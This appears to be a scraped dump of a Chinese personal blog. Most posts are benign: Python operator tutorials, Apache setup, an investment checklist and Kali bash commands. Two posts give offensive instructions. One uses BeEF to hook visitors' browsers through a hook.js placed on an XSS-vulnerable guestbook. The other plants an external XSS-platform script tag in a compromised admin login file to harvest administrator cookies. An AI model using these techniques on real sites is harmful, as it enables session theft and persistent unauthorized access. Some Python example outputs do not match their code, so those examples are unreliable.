里，整数除整数，只能得出整数。如果要得到小数部分，把其中一个数改成浮点数即可。 &gt;&gt;&gt; 1/2 0 &gt;&gt;&gt; 1.0/2 0.5 &gt;&gt;&gt; 1/float(2) 0.5 Python比较运算符 以下假设变量a为10，变量b为20： 运算符 描述 实例 == 等于 - 比较对象是否相等 (a == b) 返回 False。 != 不等于 - 比较两个对象是否不相等 (a != b) 返回 true. &lt;&gt; 不等于 - 比较两个对象是否不相等 (a &lt;&gt; b) 返回 true。这个运算符类似 != 。 &gt; 大于 - 返回x是否大于y (a &gt; b) 返回 False。 &lt; 小于 - 返回x是否小于y。所有比较运算符返回1表示真，返回0表示假。这分别与特殊的变量True和False等价。 (a &lt; b) 返回 true。 &gt;= 大于等于 - 返回x是否大于等于y。 (a &gt;= b) 返回 False。 &lt;= 小于等于 - 返回x是否小于等于y。 (a &lt;= b) 返回 true。 以下实例演示了Python所有比较运算符的操作： 1234567891011121314151617181920212223242526272829303132333435363738394041a = 21b = 10c = 0if a == b: print(\"1 - a 等于 b\")else: print( \"1 - a 不等于 b\")if a != b: print( \"2 - a 不等于 b\")else: print( \"2 - a 等于 b\")if a &lt; b: print( \"3 - a 不等于 b\")else: print( \"3 - a 等于 b\")if a &lt; b: print (\"4 - a 小于 b\")else: print( \"4 - a 大于等于 b\")if a &gt; b: print( \"5 - a 大于 b\")else: print (\"5 - a 小于等于 b\")# 修改变量 a 和 b 的值a = 5b = 20if a &lt;= b: print(\"6 - a 小于等于 b\")else: print(\"6 - a 大于 b\")if b &gt;= a: print(\"7 - b 大于等于 a\")else: print(\"7 - b 小于 a\") 以上实例输出结果： 1 - a 不等于 b 2 - a 不等于 b 3 - a 不等于 b 4 - a 大于等于 b 5 - a 大于 b 6 - a 小于等于 b 7 - b 大于等于 a 以下实例演示了Python所有赋值运算符的操作： 12345678910111213141516171819202122232425a = 21b = 10c = 0c = a + bprint( \"1 - c 的值为：\", c)c += aprint( \"2 - c 的值为：\", c)c *= aprint( \"3 - c 的值为：\", c)c /= aprint( \"4 - c 的值为：\", c)c = 2c %= aprint( \"5 - c 的值为：\", c)c **= aprint( \"6 - c 的值为：\", c)c //= aprint( \"7 - c 的值为：\", c) 以上实例输出结果： 1 - c 的值为： 31 2 - c 的值为： 52 3 - c 的值为： 1092 4 - c 的值为： 52 5 - c 的值为： 2 6 - c 的值为： 2097152 7 - c 的值为： 99864 Python位运算符 按位运算符是把数字看作二进制来进行计算的。Python中的按位运算法则如下： 下表中变量 a 为 60，b 为 13，二进制格式如下： a = 0011 1100 b = 0000 1101 ----------------- a&amp;b = 0000 1100 a|b = 0011 1101 a^b = 0011 0001 ~a = 1100 0011 运算符 描述 实例 &amp; 按位与运算符：参与运算的两个值,如果两个相应位都为1,则该位的结果为1,否则为0 (a &amp; b) 输出结果 12 ，二进制解释： 0000 1100 | 按位或运算符：只要对应的二个二进位有一个为1时，结果位就为1。 (a | b) 输出结果 61 ，二进制解释： 0011 1101 ^ 按位异或运算符：当两对应的二进位相异时，结果为1 (a ^ b) 输出结果 49 ，二进制解释： 0011 0001 ~ 按位取反运算符：对数据的每个二进制位取反,即把1变为0,把0变为1 。~x 类似于 -x-1 (~a ) 输出结果 -61 ，二进制解释： 1100 0011，在一个有符号二进制数的补码形式。 &lt;&lt; 左移动运算符：运算数的各二进位全部左移若干位，由 &lt;&lt; 右边的数字指定了移动的位数，高位丢弃，低位补0。 a &lt;&lt; 2 输出结果 240 ，二进制解释： 1111 0000 &gt;&gt; 右移动运算符：把&quot;&gt;&gt;&quot;左边的运算数的各二进位全部右移若干位，&gt;&gt; 右边的数字指定了移动的位数 a &gt;&gt; 2 输出结果 15 ，二进制解释： 0000 1111 以下实例演示了Python所有位运算符的操作： 123456789101112131415161718192021a = 60 # 60 = 0011 1100b = 13 # 13 = 0000 1101c = 0c = a &amp; b # 12 = 0000 1100print(\"1 - c 的值为：\", c)c = a | b # 61 = 0011 1101print(\"2 - c 的值为：\", c)c = a ^ b # 49 = 0011 0001print(\"3 - c 的值为：\", c)c = ~a # -61 = 1100 0011print(\"4 - c 的值为：\", c)c = a &lt;&lt; 2 # 240 = 1111 0000print(\"5 - c 的值为：\", c)c = a &gt;&gt; 2 # 15 = 0000 1111print(\"6 - c 的值为：\", c) 以上实例输出结果： 1 - c 的值为： 12 2 - c 的值为： 61 3 - c 的值为： 49 4 - c 的值为： -61 5 - c 的值为： 240 6 - c 的值为： 15 Python逻辑运算符 Python语言支持逻辑运算符，以下假设变量 a 为 10, b为 20: 运算符 逻辑表达式 描述 实例 and x and y 布尔&quot;与&quot; - 如果 x 为 False，x and y 返回 False，否则它返回 y 的计算值。 (a and b) 返回 20。 or x or y 布尔&quot;或&quot; - 如果 x 是非 0，它返回 x 的值，否则它返回 y 的计算值。 (a or b) 返回 10。 not not x 布尔&quot;非&quot; - 如果 x 为 True，返回 False 。如果 x 为 False，它返回 True。 not(a and b) 返回 False 以上实例输出结果： 12345678910111213141516a = 0b = 20if a and b: print(\"3 - 变量 a 和 b 都为 true\")else: print(\"3 - 变量 a 和 b 有一个不为 true\")if a or b: print(\"4 - 变量 a 和 b 都为 true，或其中一个变量为 true\")else: print(\"4 - 变量 a 和 b 都不为 true\")if not (a and b): print(\"5 - 变量 a 和 b 都为 false，或其中一个变量为 false\")else: print(\"5 - 变量 a 和 b 都为 true\") 以上实例输出结果： 1 - 变量 a 和 b 都为 true 2 - 变量 a 和 b 都为 true，或其中一个变量为 true 3 - 变量 a 和 b 有一个不为 true 4 - 变量 a 和 b 都为 true，或其中一个变量为 true 5 - 变量 a 和 b 都为 false，或其中一个变量为 false Python成员运算符 除了以上的一些运算符之外，Python还支持成员运算符，测试实例中包含了一系列的成员，包括字符串，列表或元组。 运算符 描述 实例 in 如果在指定的序列中找到值返回 True，否则返回 False。 x 在 y 序列中 , 如果 x 在 y 序列中返回 True。 not in 如果在指定的序列中没有找到值返回 True，否则返回 False。 x 不在 y 序列中 , 如果 x 不在 y 序列中返回 True。 以下实例演示了Python所有成员运算符的操作： 1234567891011121314151617181920a = 10b = 20list = [1, 2, 3, 4, 5]if (a in list): print(\"1 - 变量 a 在给定的列表中 list 中\")else: print(\"1 - 变量 a 不在给定的列表中 list 中\")if (b not in list): print(\"2 - 变量 b 不在给定的列表中 list 中\")else: print(\"2 - 变量 b 在给定的列表中 list 中\")# 修改变量 a 的值a = 2if (a in list): print(\"3 - 变量 a 在给定的列表中 list 中\")else: print(\"3 - 变量 a 不在给定的列表中 list 中\") 以上实例输出结果： 1 - 变量 a 不在给定的列表中 list 中 2 - 变量 b 不在给定的列表中 list 中 3 - 变量 a 在给定的列表中 list 中 Python身份运算符 身份运算符用于比较两个对象的存储单元 运算符 描述 实例 is is 是判断两个标识符是不是引用自一个对象 x is y, 类似 id(x) == id(y) , 如果引用的是同一个对象则返回 True，否则返回 False is not is not 是判断两个标识符是不是引用自不同对象 x is not y ， 类似 id(a) != id(b)。如果引用的不是同一个对象则返回结果 True，否则返回 False。 注： id() 函数用于获取对象内存地址。 以下实例演示了Python所有身份运算符的操作： 123456789101112131415161718192021222324a = 20b = 20if (a is b): print(\"1 - a 和 b 有相同的标识\")else: print(\"1 - a 和 b 没有相同的标识\")if (a is not b): print(\"2 - a 和 b 没有相同的标识\")else: print(\"2 - a 和 b 有相同的标识\")# 修改变量 b 的值b = 30if (a is b): print(\"3 - a 和 b 有相同的标识\")else: print(\"3 - a 和 b 没有相同的标识\")if (a is not b): print(\"4 - a 和 b 没有相同的标识\")else: print(\"4 - a 和 b 有相同的标识\") 以上实例输出结果： 1 - a 和 b 有相同的标识 2 - a 和 b 有相同的标识 3 - a 和 b 没有相同的标识 4 - a 和 b 没有相同的标识 is 与 == 区别： is 用于判断两个变量引用对象是否为同一个(同一块内存空间)， == 用于判断引用变量的值是否相等。 &gt;&gt;&gt; a = [1, 2, 3] &gt;&gt;&gt; b = a &gt;&gt;&gt; b is a True &gt;&gt;&gt; b == a True &gt;&gt;&gt; b = a[:] &gt;&gt;&gt; b is a False &gt;&gt;&gt; b == a True Python运算符优先级 以下表格列出了从最高到最低优先级的所有运算符： 运算符 描述 ** 指数 (最高优先级) ~ + - 按位翻转, 一元加号和减号 (最后两个的方法名为 +@ 和 -@) * / % // 乘，除，取模和取整除 + - 加法减法 &gt;&gt; &lt;&lt; 右移，左移运算符 &amp; 位 ‘AND’ ^ | 位运算符 &lt;= &lt; &gt; &gt;= 比较运算符 &lt;&gt; == != 等于运算符 = %= /= //= -= += *= **= 赋值运算符 is is not 身份运算符 in not in 成员运算符 not and or 逻辑运算符 以下实例演示了Python所有运算符优先级的操作： 1234567891011121314151617a = 20b = 10c = 15d = 5e = 0e = (a + b) * c / d # ( 30 * 15 ) / 5print(\"(a + b) * c / d 运算结果为：\", e)e = (a + b) * c / d # (30 * 15 ) / 5print(\"((a + b) * c) / d 运算结果为：\", e)e = (a + b) * (c / d); # (30) * (15/5)print(\"(a + b) * (c / d) 运算结果为：\", e)e = a + (b * c) / d; # 20 + (150/5)print(\"a + (b * c) / d 运算结果为：\", e) 以上实例输出结果： (a + b) * c / d 运算结果为： 90 ((a + b) * c) / d 运算结果为： 90 (a + b) * (c / d) 运算结果为： 90 a + (b * c) / d 运算结果为： 50","categories":[{"name":"Python","slug":"Python","permalink":"https://xiaowuyoucy.github.io/categories/Python/"}],"tags":[{"name":"Python运算符","slug":"Python运算符","permalink":"https://xiaowuyoucy.github.io/tags/Python运算符/"}]},{"title":"apache配置","slug":"201908210144","date":"2019-08-20T17:54:00.000Z","updated":"2019-08-20T18:28:40.119Z","comments":true,"path":"2019/08/21/201908210144/","link":"","permalink":"https://xiaowuyoucy.github.io/2019/08/21/201908210144/","excerpt":"","text":"1.1 Apache的安装 对应的软件如下： Apache安装步骤： 1.解压“httpd-2.4.29-x86-r2.zip”，并将解压后的所有文件拷贝到目标文件夹wamp/apache下。 2.修改apache主配置文件(httpd.conf)中的“SVRROOT”为apache的实际目录。 提示：要修改的文件为：wamp/apache/conf/httpd.conf，大约第38行处。 管理员模式下运行cmd(或powershell)，并在其中运行apache/bin下的命令httpd.exe 如下所示：httpd.exe -k install 提示： httpd.exe所在位置为：apache/bin/目录中 如果想要删除该服务，则运行：httpd.exe -k uninstallt 4.双击打开如下文件并启动服务：wamp/apche/bin/ApacheMonitor.exe 1.2 检测apache配置文件语法的命令","categories":[{"name":"apache","slug":"apache","permalink":"https://xiaowuyoucy.github.io/categories/apache/"}],"tags":[{"name":"apache配置","slug":"apache配置","permalink":"https://xiaowuyoucy.github.io/tags/apache配置/"},{"name":"apache环境变量","slug":"apache环境变量","permalink":"https://xiaowuyoucy.github.io/tags/apache环境变量/"}]},{"title":"如何判断一个项目是否值得投资","slug":"201907150214","date":"2019-07-14T18:27:00.000Z","updated":"2019-07-14T18:57:02.008Z","comments":true,"path":"2019/07/15/201907150214/","link":"","permalink":"https://xiaowuyoucy.github.io/2019/07/15/201907150214/","excerpt":"","text":"一、看准 一个团队（1个团队） 投资就是投人，投资就是投团队，尤其要看准投团队的领头人。创东方对目标企业团队成员的要求是：富有激情、和善诚信、专业敬业、善于学习。 二、发掘 两个优势（1优势行业+2优势企业） 在优势行业中发掘、寻找优势企业。优势行业是指具有广阔发展前景、国家政策支持、市场成长空间巨大的行业；优势企业是在优势行业中具有核心竞争力，细分行业排名靠前的优秀企业，其核心业务或主营业务要突出，企业的核心竞争力要突出，要超越其他竞争者。 三、弄清 三个模式（1业务模式+2盈利模式+3营销模式） 就是弄清目标企业是如何挣钱的。业务模式是企业提供什么产品或服务，业务流程如何实现，包括业务逻辑是否可行，技术是否可行，是否符合消费者心理和使用习惯等，企业的人力、资金、资源是否足以支持。盈利模式是指企业如何挣钱，通过什么手段或环节挣钱。营销模式是企业如何推广自己的产品或服务，销售渠道、销售激励机制如何等。好的业务模式，必须能够赢利，好的赢利模式，必须能够推行。 四、查看 四个指标（1营业收入+2营业利润+3净利率+4增长率） PE 投资的重要目标是目标企业尽快改制上市，我们因此关注、查看近目标企业近三年的上述前两个指标尤为重要。PE投资非常看重的盈利能力和成长性，我们由此关注上述的后两个指标。净利率是销售净利润率，表达了一个企业的盈利能力和抗风险能力，增长率可以迅速降低投资成本，让投资人获取更高的投资回报。把握前四个指标，则基本把握了项目的可投资性。 五、厘清 五个结构（1股权结构+2高管结构+3业务结构+4客户结构+5供应商结构） 厘清五个结构也很重要，让投资人对目标企业的具体结构很清晰，便于判断企业的好坏优劣。 股权结构：主次分明，主次合理； 高管结构：结构合理，优势互补，团结协作； 业务结构：主营突出，不但研发新产品； 客户结构：既不太散又不太集中，客户有实力； 供应商结构：既不太散又不太集中，质量有保证。 六、考察六个层面（1历史合规+2财务规范+3依法纳税+4产权清晰+5劳动合规+6环保合规） 考察六个层面是对目标企业的深度了解，任何一个层面存在关键性问题，可能影响企业的改制上市。当然，有些企业存在一些细小暇疵，可以通过规范手段予以改进。 历史合规：目标企业的历史沿革合法和规，在注册验资、股权变更等方面不存在重大历史瑕疵； 财务规范：财务制度健全，会计标准合规，坚持公正审计； 依法纳税：不存在依法纳税的问题； 产权清晰：企业的产权清晰到位（含专利、商标、房产等），不存在纠纷； 劳动合规：严格执行劳动法规； 6. 环保合规：企业生产经营符合环保要求，不存在搬迁、处罚等隐患。 七、落实 七个关注（1制度汇编+2例会制度+3企业文化+4战略规划+5人力资源+6公共关系+7激励机制） 七个关注是对目标企业细小环节的关注。如果存在其中的问题，可以通过规范、引导的办法加以改进。但其现状是我们判断目标企业经营管理的重要依据。 制度汇编：查看企业的制度汇编可以迅速认识企业管理的规范程度。有的企业制度不全，更没有制度汇编； 例会制度：询问企业的例会情况（含总经理办公周例会、董事会例会、股东会例会）能够了解规范管理情况，也能了解企业高管对股东是否尊重； 企业文化：通过了解企业的文化建设能知道企业是否具有凝聚力和亲和力，是否具备长远发展的可能； 战略规划：了解企业的战略规划情况，可以知道企业的发展有无目标，查看其目标是否符合行业经济发展的实际方向； 人力资源：了解企业对员工培训、激励计划、使用办法，可以了解企业是否能充分调动全体员工发展业务的积极性和能动性，考察企业的综合竞争力； 公共关系：了解企业的公共关系策略和状况，可以知道企业是否具备社会公民意识，是否注重企业形象和品牌，是否具有社会责任意识； 激励机制：一个优秀的现代企业应该有一个激励员工、提升团队的机制或计划，否则，企业难于持续做强做大。 八、分析八个数据（1.总资产周转率、2资产负债率、3.流动比率、4.应收帐款周转天数（应收帐款周转率）、5、销售毛利率、6.净值报酬率、7.经营活动净现金流、8、市场占有率） 在厘清四个指标的基础上，我们很有必要分析以下八个数据，是我们对目标企业的深度分析、判断。 资产周转率：表示多少资产创造多少销售收入，表明一个公司是资产（资本）密集型还是轻资产型。该项指标反映资产总额的周转速度，周转越快，反映销售能力越强，企业可以通过薄利多销的办法，加速资产的周转，带来利润绝对数的增加。计算公式：总资产周转率=销售收入÷平均总资产 资产负债率：资产负债率是负债总额除以资产总额的百分比，也就是负债总额与资产总额的比例关系。资产负债率反映在总资产中有多大比例是通过借债来筹资的，也可以衡量企业在清算时保护债权人利益的程度；资产负债率的高低，体现一个企业的资本结构是否合理。计算公式：资产负债率=（负债总额÷资产总额）×100% 流动比率：流动比率是流动资产除以流动负债的比例，反映企业的短期偿债能力。流动资产是最容易变现的资产，流动资产越多，流动负债越少，则短期偿债能力越强。计算公式：流动比率=流动资产÷流动负债 应收帐款周转天数（应收帐款周转率）：应收帐款周转率反映应收帐款的周转速度，也就是年度内应收帐款转为现金的平均次数。用时间表示的周转速度是应收帐款周转天数，也叫平均收现期，表示自企业从取得应收帐款的权利到收回款项，转换为现金所需要的时间。一般来说，应收帐款周转率越高、平均收帐期越短，说明应收帐款收回快。否则，企业的营运资金会过多地呆滞在应收帐款上，影响正常的资金周转。计算公式：应收帐款周转率=销售收入÷平均应收帐款；应收帐款周转天数=360÷应收帐款周转率 销售毛利率：销售毛利率,表示每一元销售收入扣除销售产品或商品成本后,有多少钱可以用于各期间费用和形成利泣,是企业销售净利率的最初基础,没有足够大的毛利率便不能盈利。计算公式：销售毛利率=（销售收入-销售成本）÷销售收入）×100%。 净值报酬率：净值报酬率是净利润与平均股东权益（所有者权益）的百分比，也叫股东权益报酬率。该指标反映股东权益的收益水平。计算公式：净值报酬率=（净利润÷平均股东权益）×100% 经营活动净现金流：经营活动净现金流，是企业在一个会计期间（年度或月份，通常指年度）经营活动产生的现金流入与经营活动产生的现金流出的差额。这一指标说明经营活动产生现金的能力，企业筹集资金额根据实际生产经营需要，通过现金流量表，可以确定企业筹资总额。一般来说，企业财务状况越好，现金净流量越多，所需资金越少，反之，财务状况越差，现金净流量越少，所需资金越多。一个企业经营净现金流量为负，说明企业需筹集更多的资金满足于生产经营所需，否则企业正常生产经营难以为继。 市场占有率：市场占有率，也可称为“市场份额”是企业在运作的市场上所占有的百分比，是企业的产品在市场上所占份额，也就是企业对市场的控制能力。企业市场份额的不断扩大，可以使企业获得某种形式的垄断，这种垄断既能带来垄断利润又能保持一定的竞争优势。当一个企业获得市场25%的占有率时，一般就被认为控制了市场。市场占有率对企业至关重要，一方面它是反映企业经营业绩最关键的指标之一，另一方面它是企业市场地位最直观的体现。市场占有率是由企业的产品力、营销力和形象力共同决定的。 九、走好九个程序（1收集资料+2高管面谈+3企业考察+4竞争调查+5供应商走访+6客户走访+7协会走访+8政府走访+9券商咨询） 要做好一个投资项目，我们有很多程序要走，而且不同的目标企业所采取的程序应该有所不同、分别对待，但是以下就个程序是应该坚持履行的。 收集资料：通过多种形式收集企业资料； 高管面谈：高管面谈，是创业投资的一个初步环境也是非常重要的环节。依据过往经验，往往能很快得出对目标企业业务发展、团队素质的印象。有时一次高管接触，你就不想再深入下去了，因为印象不好。第一感觉往往很重要，也比较可靠。 企业考察：对企业的经营、研发、生产、管理、资源等实施实地考察；对高管以下的员工进行随机或不经意的访谈，能够得出更深层次的印象或结论。 竞争调查：梳理清楚该市场中的竞争格局和对手的情况。通过各种方式和途径对竞争企业进行考察、访谈或第三方评价；对比清楚市场中的各种竞争力量及其竞争优劣势。对竞争企业的信息和对比掌握得越充分、投资的判断就会越准！ 供应商走访：了解企业的采购量、信誉，可以帮助我们判断企业声誉、真实产量；同时也从侧面了解行业竞争格局； 客户走访：可以了解企业产品质量和受欢迎程度，了解企业真实销售情况，了解竞争企业情况；同时，客户自身的档次和优质情况也有助于判断企业的市场地位、以及市场需求的潜力和可持续程度。 协会走访：了解企业的行业地位和声誉，了解行业的发展态势； 政府走访：了解企业的行业地位和声誉，了解政府对企业所处行业的支持程度； 券商咨询：针对上市可行性和上市时间问题咨询券商，对我们判断企业成熟度有重要作用。 十、报告 十个内容（1 企业历史沿革2企业产品与技术3行业分析（机会与威胁） 4企业优势及不足 5发展规划6股权结构 7高管结构 8财务分析 9融资计划 10投资意见） 《尽职调查报告》是创业投资业务的基本功，是对前期工作的总结，是最终决策依据。写好《尽职调查报告》，至少应报告以下10个方面的主要内容。 企业历史沿革：股权变动情况，重大历史事件等； 企业产品与技术：公司业务情况、技术来源； 行业分析：行业概况、行业机会与威胁，竞争对手分析； 优势和不足：企业有哪些优势，哪些是核心竞争力；存在不足或缺陷，有无解决或改进办法； 发展规划：企业的近期、中期的发展规划和发展战略；以及发展规划的可实现性； 股权结构：股权结构情况，合理性分析； 高管结构：高管人员和技术人员背景情况，优势、劣势分析； 财务分析：近年各项财务数据或指标情况及分析； 融资计划：企业发展计划和融资计划及融资条件； 投资意见：投资经理对项目的总体意见或建议。 “厨师炒菜，各有各法。”每家创业投资团队都有自己看项目的办法，创东方的投资要诀只是其中的一种而已。","categories":[{"name":"理财投资","slug":"理财投资","permalink":"https://xiaowuyoucy.github.io/categories/理财投资/"}],"tags":[{"name":"理财，投资","slug":"理财，投资","permalink":"https://xiaowuyoucy.github.io/tags/理财，投资/"}]},{"title":"Python笔记","slug":"201905262134","date":"2019-05-26T13:46:01.000Z","updated":"2019-05-26T14:03:39.803Z","comments":true,"path":"2019/05/26/201905262134/","link":"","permalink":"https://xiaowuyoucy.github.io/2019/05/26/201905262134/","excerpt":"","text":"Python是荷兰著名的“龟叔”Guido van Rossum在1989年圣诞节期间，为了打发无聊的圣诞节而编写的一个编程语言，现在，全世界差不多有600多种编程语言，但流行的编程语言也就那么20来种。如果你听说过TIOBE排行榜，你就能知道编程语言的大致流行程度。这是最近10年最常用的10种编程语言的变化图： 总的来说，这几种编程语言各有千秋。C语言是可以用来编写操作系统的贴近硬件的语言，所以，C语言适合开发那些追求运行速度、充分发挥硬件性能的程序。而Python是用来编写应用程序的高级编程语言，当你用一种语言开始作真正的软件开发时，你除了编写代码外，还需要很多基本的已经写好的现成的东西，来帮助你加快开发进度。比如说，要编写一个电子邮件客户端，如果先从最底层开始编写网络协议相关的代码，那估计一年半载也开发不出来。高级编程语言通常都会提供一个比较完善的基础代码库，让你能直接调用，比如，针对电子邮件协议的SMTP库，针对桌面环境的GUI库，在这些已有的代码库的基础上开发，一个电子邮件客户端几天就能开发出来。 Python就为我们提供了非常完善的基础代码库，覆盖了网络、文件、GUI、数据库、文本等大量内容，被形象地称作“内置电池（batteries included）”。用Python开发，许多功能不必从零编写，直接使用现成的即可；除了内置的库外，Python还有大量的第三方库，也就是别人开发的，供你直接使用的东西。当然，如果你开发的代码通过很好的封装，也可以作为第三方库给别人使用。 许多大型网站就是用Python开发的，例如YouTube、Instagram，还有国内的豆瓣。很多大公司，包括Google、Yahoo等，甚至NASA（美国航空航天局）都大量地使用Python；龟叔给Python的定位是“优雅”、“明确”、“简单”，所以Python程序看上去总是简单易懂，初学者学Python，不但入门容易，而且将来深入下去，可以编写那些非常非常复杂的程序。 总的来说，Python的哲学就是简单优雅，尽量写容易看明白的代码，尽量写少的代码。如果一个资深程序员向你炫耀他写的晦涩难懂、动不动就几万行的代码，你可以尽情地嘲笑他。 那Python适合开发哪些类型的应用呢？ 首选是网络应用，包括网站、后台服务等等； 其次是许多日常需要的小工具，包括系统管理员需要的脚本任务等等； 另外就是把其他语言开发的程序再包装起来，方便使用。 最后说说Python的缺点。 任何编程语言都有缺点，Python也不例外。优点说过了，那Python有哪些缺点呢？ 第一个缺点就是运行速度慢，和C程序相比非常慢，因为Python是解释型语言，你的代码在执行时会一行一行地翻译成CPU能理解的机器码，这个翻译过程非常耗时，所以很慢。而C程序是运行前直接编译成CPU能执行的机器码，所以非常快。 但是大量的应用程序不需要这么快的运行速度，因为用户根本感觉不出来。例如开发一个下载MP3的网络应用程序，C程序的运行时间需要0.001秒，而Python程序的运行时间需要0.1秒，慢了100倍，但由于网络更慢，需要等待1秒，你想，用户能感觉到1.001秒和1.1秒的区别吗？这就好比F1赛车和普通的出租车在北京三环路上行驶的道理一样，虽然F1赛车理论时速高达400公里，但由于三环路堵车的时速只有20公里，因此，作为乘客，你感觉的时速永远是20公里。","categories":[{"name":"编程开发","slug":"编程开发","permalink":"https://xiaowuyoucy.github.io/categories/编程开发/"}],"tags":[{"name":"Python教程","slug":"Python教程","permalink":"https://xiaowuyoucy.github.io/tags/Python教程/"},{"name":"Python笔记","slug":"Python笔记","permalink":"https://xiaowuyoucy.github.io/tags/Python笔记/"}]},{"title":"beef劫持客户端浏览器","slug":"201904250308","date":"2019-04-23T14:44:01.000Z","updated":"2019-05-07T13:59:05.919Z","comments":true,"path":"2019/04/23/201904250308/","link":"","permalink":"https://xiaowuyoucy.github.io/2019/04/23/201904250308/","excerpt":"","text":"kali linux里集合了beef劫持客户端浏览器的工具，beef是比较著名的一个xss利用框架， 它是基于web界面的交换方式友好，高度集成，开源的一个项目！和国外其他渗透测试项目一样，它也可以和其他很多工具结合使用，如MSF。 使用方法： 打开kali linux 打开终端搜索 find / -name beef root@kali:~# find / -name beef /usr/share/beef-xss/beef /usr/share/python-faraday/plugins/repo/beef find: ‘/run/user/130/gvfs’: 权限不够 root@kali:~# ^C root@kali:~# find搜索到beef的所在路径，我们需要切换到beef的所在目录将其启动即可 cd /usr/share/beef-xss 切换到beef所在目录 ./beef 启动运行 启动之后beef会有详细的参数地址给出，如下图： Hook URL: http://192.168.1.115:3000/hook.js hook是一个利用的js外链，每当XSS攻击执行该行js代码之后就会被触发 UI URL: http://192.168.1.115:3000/ui/panel 这是beef的控制端，每当hook被触发之后beef控制端就能控制客户端的一系列浏览器活动信息，比如Cookie和转跳，恶意下载木马链接等等操作。 我们把beef的利用代码 http://192.168.1.115:3000/hook.js 以js脚本的方式提交在有xss利用漏洞的留言板上， 每当客户端的浏览器访问即触发beef的利用代码，beef服务端上线达到控制客户端的浏览器权限 我们模拟一下客户端访问浏览器，这是会触发beef的恶意代码，我们可以看到如下的gif，beef的服务器可以，进行客户端浏览器的操作，转跳 ,下载，盗取cookie等… 结合beef 可以进行很多漏洞利用的操作，这就是beef的强大之处吧。","categories":[{"name":"WEB安全渗透","slug":"WEB安全渗透","permalink":"https://xiaowuyoucy.github.io/categories/WEB安全渗透/"}],"tags":[{"name":"XSS","slug":"XSS","permalink":"https://xiaowuyoucy.github.io/tags/XSS/"},{"name":"beef劫持","slug":"beef劫持","permalink":"https://xiaowuyoucy.github.io/tags/beef劫持/"}]},{"title":"XSS-Cookie维持权限应用","slug":"201904232243","date":"2019-04-23T14:44:01.000Z","updated":"2019-04-24T05:19:22.541Z","comments":true,"path":"2019/04/23/201904232243/","link":"","permalink":"https://xiaowuyoucy.github.io/2019/04/23/201904232243/","excerpt":"","text":"Cookie维持权限应用 条件： 1.已经获取网站webshell权限 2.网站后台目录文件有可写权限 漏洞原理： 利用js代码获取每次登陆成功的用户Cookie（管理员权限） 接下来我们演示一下，这个过程，这里我首先注册一下配置一下XSS平台 推荐大家到 https://xsspt.com 是个免费不错的XSS测试利用平台， 注册好之后我们添加项目，如下图所示配置： 填写完信息之后点击下一步 勾选上这几项，之后点击下一步，就配置完成XSS基本的测试了， 之后找到该项目的测试代码。 将如下代码植入怀疑出现xss的地方（注意’的转义），即可在 项目内容 观看XSS效果。 1&lt;script src=https://xsspt.com/9f6glg&gt;&lt;/script&gt; 把该代码嵌入到你要维权的后台登陆的那个配置文件即可，这里我就搭建一个本地测试， 我找到该项目后台的配置文件， 用编辑的方式打开，把刚才XSS测试的代码复制进去，之后点击关闭保持， 好，做完这步操作之后，我们来测试一下，假设现在管理员登陆后台，我们看看能不能通过， 刚才的手段获取到我们想要的信息， 登陆进来了，我们这时再回到XSS平台点击项目，看看有没有接收到管理员登陆的Cookie和其他一些相关信息， 看这里已经实时的把管理员登陆的Cookie和其他一些相关信息接收过来了，这些都是很常见的一些， Cookie维权方式之一吧。","categories":[{"name":"WEB安全渗透","slug":"WEB安全渗透","permalink":"https://xiaowuyoucy.github.io/categories/WEB安全渗透/"}],"tags":[{"name":"XSS","slug":"XSS","permalink":"https://xiaowuyoucy.github.io/tags/XSS/"},{"name":"Cookie","slug":"Cookie","permalink":"https://xiaowuyoucy.github.io/tags/Cookie/"}]},{"title":"KaliLinux-Bash命令","slug":"201904212314","date":"2019-04-22T12:32:18.000Z","updated":"2019-04-27T10:31:11.766Z","comments":true,"path":"2019/04/22/201904212314/","link":"","permalink":"https://xiaowuyoucy.github.io/2019/04/22/201904212314/","excerpt":"","text":"12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879ls -l 显示当前目录的文件信息,大小以字节显示ls -lh 显示当前目录的文件信息,大小以KBls -lh --sort=size 当前文件目录按大小顺序排序ls -a 显示当前目录的隐藏文件ls -lh --sort=time 按时间排序，最新修改的排最上cd 进入某个目录和Windows的cd一样pwd 查看当前工作目录clean 清屏cat /var/log/messages 查看文本文件more /var/log/messages 显示一屏的内容，以百分比的显示，当看完一屏可以回车看下一屏tail -20 /var/log/messages 查看文本文件最后的20行内容watch -n 2 tail -20 /var/log/messages 查看文本文件最后的20行内容,每各两秒实时刷新一次当前文件文本信息mkdir+要创建的文件名touch &#123;a,b,c&#125;.txt 创建3个名为a,b,c.txt的文本cp -r test/zwj/ 将 test整个目录拷贝到 zwj下mr+文件名 执行删除功能的命令cp+要拷贝的文件+拷贝后的新文件名cp -r 文件目录名/ 新文件目录名 拷贝目录文件mr -rf 文件目录名 删除拷贝目录top 监测性能信息进程信息等kill PID 结束进程的作用ps aux 显示进程项目信息grep ssh /ext/passwd 查看passwd文件含有ssh字符串的信息ifconfig eth0 down 将网卡卸掉ifconfig eth0 up 启动网卡netstat -pantu 查看产生的TCP/UDP交互网络链接信息netstat -pantu | egrep -v &quot;0.0.0.0|:::&quot; 含有0.0.0和::: 被过滤掉不显示出来netstat -pantu | egrep -v &quot;0.0.0.0|:::&quot; | awk &apos;&#123;print $5&#125;&apos; 以netstat 的信息 输出第五列的信息netstat -pantu | egrep -v &quot;0.0.0.0|:::&quot; | awk &apos;&#123;print $5&#125;&apos; cut -d &apos;:&apos; -f 1 行内进行分块 只显示第一块netstat -pantu | egrep -v &quot;0.0.0.0|:::&quot; | awk &apos;&#123;print $5&#125;&apos; cut -d &apos;:&apos; -f 1 sort 行内进行分块 只显示第一块 对查出来的内容进行排序netstat -pantu | egrep -v &quot;0.0.0.0|:::&quot; | awk &apos;&#123;print $5&#125;&apos; cut -d &apos;:&apos; -f 1 sort | uniq 行内进行分块 只显示第一块 对查出来的内容进行排序，之后过滤重复的内容netstat -pantu | egrep -v &quot;0.0.0.0|:::&quot; | awk &apos;&#123;print $5&#125;&apos; cut -d &apos;:&apos; -f 1 sort | uniq &gt; ip 行内进行分块 只显示第一块 对查出来的内容进行排序，之后过滤重复的内容 导出到IP文本mount 挂载文件dmesg 查看messages 文件内容find / -name nmap 从根目录开始查找，叫nmap的文件find . -name &quot;ps*&quot; 当前目录下 ps开头的都查找出来find . -name &quot;ps*&quot; -exec cp &#123;&#125; /tmp/&#123;&#125;.bak \\; 当前目录下 